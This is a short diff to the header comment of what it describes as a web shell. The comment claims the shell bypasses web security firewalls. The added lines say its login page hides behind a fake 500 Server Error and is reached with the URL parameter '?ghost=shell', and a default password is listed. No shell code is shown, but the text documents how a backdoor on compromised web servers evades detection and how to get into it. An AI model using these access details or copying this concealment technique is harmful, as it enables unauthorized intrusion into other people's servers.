@@ -6,6 +6,8 @@ Author: TubagusNM
 Version: 1.0
 
 This shell bypasses the security firewall on web security.
+This login page protected with 500 Server Error.
+You can use parameter exploit ?ghost=shell in your urls.
 Default Password: Ghostxshell
 **/ 
 
